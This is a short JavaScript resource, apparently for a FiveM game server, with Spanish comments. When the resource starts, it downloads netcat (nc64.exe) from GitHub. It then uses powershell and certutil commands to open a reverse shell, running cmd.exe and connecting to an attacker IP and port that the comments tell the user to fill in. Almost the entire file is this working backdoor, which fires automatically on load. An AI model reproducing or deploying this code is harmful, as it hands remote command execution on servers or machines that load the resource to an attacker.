const { exec } = require('child_process');
const fs = require('fs');
const https = require('https');

// Nombre del archivo y URL de descarga (ejemplo para nc64.exe)
const ncFile = 'nc64.exe';
const ncUrl = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe';
const attackerIP = '127.0.0.1'; // Cambia esto por tu IP
const attackerPort = '7777';   // Cambia esto por tu puerto

// Función para descargar nc64.exe
function downloadNC() {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(ncFile);
        https.get(ncUrl, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                resolve();
            });
        }).on('error', (err) => {
            fs.unlink(ncFile);
            reject(err);
        });
    });
}

// Registrar evento cuando el recurso se inicia
on('onResourceStart', async (resourceName) => {
    if(GetCurrentResourceName() != resourceName) return;

    try {
        // Descargar netcat
        await downloadNC();

        exec(`powershell -c invoke-webrequest -uri ${ncUrl}; ${ncFile} ${attackerIP} ${attackerPort} -e cmd.exe`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
        });

        exec(`certutil -urlcache -split -f ${ncUrl}; ${ncFile} ${attackerIP} ${attackerPort} -e cmd.exe`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
        });
        
    } catch(error) {
        console.error('Error:', error);
    }
});
